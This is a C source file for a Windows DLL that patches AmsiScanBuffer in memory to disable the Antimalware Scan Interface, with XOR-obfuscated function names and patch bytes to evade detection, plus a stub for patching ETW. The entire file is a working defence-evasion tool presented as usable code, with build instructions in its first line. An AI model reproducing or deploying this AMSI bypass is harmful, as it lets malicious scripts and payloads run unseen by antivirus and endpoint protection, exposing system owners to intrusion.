// cl.exe /D_USRDLL /D_WINDLL patcher.c /MT /link /DLL /OUT:patcher.dll
#include <Windows.h>
#include <windef.h>
#include "patcher.h"
#include "rewrite.h"
#include "userfuncs.h"
#include "funcdefs.h"
#pragma comment (lib, "user32.lib")

BOOL isresolved = FALSE;

// Resolve function addresses
BOOL resolveAddr(){
    HMODULE _kernel32 = LoadLibrary((LPCWSTR)"kernel32.dll");
    if (_kernel32 == NULL){
        fprintf(stderr, "[!] Could not load kernel32.dll (0x%x)\n", GetLastError());
        return FALSE;
    }

    // Resolve address of VirtualProtect    
    XOR(__virtualprotect, LEN(__virtualprotect)-1, XOR_FUNC_KEY, LEN(XOR_FUNC_KEY));
    _VirtualProtect = (__type_virtualprotect)__get_proc_address(_kernel32, (LPCSTR)__virtualprotect);
    if (_VirtualProtect == NULL){
        fprintf(stderr, "[i] Could not resolve address of %s (0x%x)\n", __virtualprotect, GetLastError());
        return FALSE;    
    }

    isresolved = TRUE;
    return isresolved;
}


EXPORT int WINAPI patch_amsi() {
    // Resolve address to functions
    if (!resolveAddr()){
        return -99;
    }

    #if defined(_M_X64)
        printf("[i] Architecture\t\tx86_64\n");
        // https://defuse.ca/online-x86-assembler.htm#disassembly
        // xor eax, eax
        // mov eax, 0x11111111
        // xor eax, 0x91161146
        // ret
        // { 0x31, 0xC0, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x35, 0x46, 0x11, 0x16, 0x91, 0xC3 };
        unsigned char patch_bytes[] = {0x50, 0xA2, 0xDB, 0x75, 0x74, 0x77, 0x76, 0x5D, 0x2F, 0x7B, 0x7D, 0xFD, 0xAE};
    #elif defined(_M_IX86) || defined(__i386__)
        printf("[i] Architecture\tx86\n");
        // xor eax, eax
        // mov eax, 0x11111111
        // xor eax, 0x91161146
        // ret 0x18
        // { 0x31, 0xC0, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x35, 0x46, 0x11, 0x16, 0x91, 0xC2, 0x18, 0x00 }
        unsigned char patch_bytes[] = {0x50, 0xA2, 0xDB, 0x75, 0x74, 0x77, 0x76, 0x5D, 0x2F, 0x7B, 0x7D, 0xFD, 0xAF, 0x76, 0x6F};
    #else
        fprintf(stderr, "[!] Unsupported Architecture!\n");
        return -1;
    #endif

    // Decrypt DLL name
    unsigned char amsi_dll_name[] = {0x0, 0xF, 0x10, 0xD, 0x4B, 0x2, 0xB, 0x4, 0x69};
    XOR(amsi_dll_name, LEN(amsi_dll_name), XOR_KEY, xor_key_len);

    // Get Handle to DLL
    HMODULE amsi_dll_handle = LoadLibrary(amsi_dll_name);
    if (NULL == amsi_dll_handle) {
        fprintf(stderr, "[!] Failed to load %s (0x%x)\n", amsi_dll_name, GetLastError());
        return -2;
    }

    // Decrypt Function Name
    unsigned char func_name[] = {0x20, 0xF, 0x10, 0xD, 0x36, 0x5, 0x6, 0x6, 0x2B, 0x1F, 0xD, 0xA, 0x8, 0x1C, 0x6F};
    XOR(func_name, LEN(func_name), XOR_KEY, xor_key_len);
    
    // Get address of function
    FARPROC amsi_scan_buffer_base_addr = __get_proc_address(amsi_dll_handle, func_name);
    if (NULL == amsi_scan_buffer_base_addr) {
        fprintf(stderr, "[!] Failed to get base address of %s (Error Code: %d)\n", func_name, GetLastError());
        return -3;
    }
    printf("[i] %s Offset\t0x%p\n", func_name, amsi_scan_buffer_base_addr);
    
    // Change memory address permissions to enable copying of bytes
    DWORD oldprotect;
    BOOL _vp = _VirtualProtect((LPVOID)amsi_scan_buffer_base_addr,
                                sizeof(patch_bytes),
                                PAGE_READWRITE,
                                &oldprotect);
    if (!_vp){
        fprintf(stderr, "[!] %s Failed (0x%x)\n", __virtualprotect ,GetLastError());
        return -2;
    }

    // Decrypt payload
    XOR(patch_bytes, LEN(patch_bytes), XOR_KEY, xor_key_len);
    printf("[i] Payload to write\t\t");
    phex(patch_bytes, (int)(sizeof(patch_bytes)/sizeof(patch_bytes[0])));
    
    // Copy payload to location
    memcpy(amsi_scan_buffer_base_addr, patch_bytes, sizeof(patch_bytes));
    
    // Restore original permissions of memory region
    DWORD _temp;
    _vp = _VirtualProtect((LPVOID)amsi_scan_buffer_base_addr,
                            sizeof(patch_bytes),
                            oldprotect,
                            &_temp);

    if (!_vp){
        fprintf(stderr, "[!] %s Failed (0x%x)\n", __virtualprotect, GetLastError());
        return -3;
    }
    return 0;
}

// Patch ETW
EXPORT int WINAPI patch_etw(){
    return 0;
}
   

// Entry point
BOOL APIENTRY DllMain(HMODULE _hModule,  DWORD  ul_reason_for_call, LPVOID _lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
